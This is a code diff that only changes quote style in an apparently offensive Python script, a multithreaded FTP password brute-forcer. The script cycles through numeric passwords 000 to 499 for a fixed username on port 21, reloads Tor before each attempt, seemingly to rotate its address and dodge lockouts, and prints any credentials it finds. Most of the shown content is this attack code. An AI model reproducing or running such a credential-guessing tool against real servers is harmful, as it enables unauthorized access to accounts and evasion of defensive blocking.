@@ -3,25 +3,25 @@ from threading import Thread
 import queue
 import os
 
-HOST, PORT = 'localhost', 21
+HOST, PORT = "localhost", 21
 
 q = queue.Queue()
 n_threads = 10
 
-USERNAME = 'username'
+USERNAME = "username"
 
 flag = True
-to_brute_force = ['{0:03}'.format(i) for i in range(500)]
+to_brute_force = ["{0:03}".format(i) for i in range(500)]
 
 def execute():
 
     global q
     
     while True:
-        os.system('service tor reload')
+        os.system("service tor reload")
         index = q.get()
         server = ftplib.FTP()
-        print('[!] Trying ' +  str(index))
+        print("[!] Trying " +  str(index))
     
         try:
             server.connect(HOST, PORT, timeout=5)
@@ -31,9 +31,9 @@ def execute():
             pass
     
         else:
-            print('[+] Found credentials: ')
-            print(f'\tUser: {USERNAME}'+ str(index))
-            print(f'\tPassword: {str(index)}{Fore.RESET}')
+            print("[+] Found credentials: ")
+            print(f"\tUser: {USERNAME}"+ str(index))
+            print(f"\tPassword: {str(index)}{Fore.RESET}")
             
             with q.mutex:
                 q.queue.clear()
